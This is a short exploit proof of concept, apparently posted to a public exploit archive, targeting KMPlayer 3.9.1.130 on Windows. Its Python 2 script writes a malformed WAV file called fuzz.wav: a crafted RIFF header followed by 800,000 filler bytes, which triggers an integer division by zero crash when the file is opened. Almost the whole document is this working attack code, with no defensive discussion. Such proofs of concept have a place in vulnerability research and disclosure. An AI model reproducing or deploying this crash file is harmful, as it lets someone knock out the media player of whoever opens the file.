# Exploit Title: KMPlayer 3.9.1.130 Integer division by zero DoS.
# Date: 25-11-2014
# Author: Ajin Abraham
# Website: http://opensecurity.in
# Vendor Homepage: http://www.kmpmedia.net/
# Software Link: http://filehippo.com/download_kmplayer/download/7f497da5a4cda4032bf7e4a11c9e3131/
# Version: 3.9.1.130
# Tested on: Windows 7,8, 8.1

header = ("\x52\x49\x46\x46\x64\x31\x10\x00\x57\x41\x56\x45\x66\x6d\x74\x20"
"\x10\x00\x00\x00\x01\x00\x01\x00\x22\x56\x00\x00\x10\xb1\x02\x00"
"\x04\x00\x00\x00\x64\x61\x74\x61\x40\x31\x10\x00\x14\x00\x2a\x00"
"\x1a\x00\x30\x00\x26\x00\x39\x00\x35\x00\x3c\x00\x4a\x00\x3a\x00"
"\x5a\x00\x2f\x00\x67\x00\x0a")
exploit = header
exploit += "\x41" * 800000
 
try:
    print "[+] Creating POC"
    crash = open('fuzz.wav','w');
    crash.write(exploit);
    crash.close();
except:
    print "[-] No Permissions.."
